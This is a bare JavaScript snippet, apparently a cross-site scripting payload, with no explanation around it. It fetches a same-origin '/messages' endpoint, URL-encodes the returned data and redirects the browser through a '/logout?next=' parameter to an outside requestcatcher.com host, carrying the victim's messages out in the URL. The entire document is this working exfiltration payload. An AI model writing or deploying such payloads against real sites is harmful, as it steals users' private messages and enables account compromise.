fetch('/messages?id=1')
  .then(r => r.json())
  .then(data => {
    let encoded = encodeURIComponent(JSON.stringify(data));
    window.location = '/logout?next=https://penesdecolores.requestcatcher.com/' + encoded;
  });
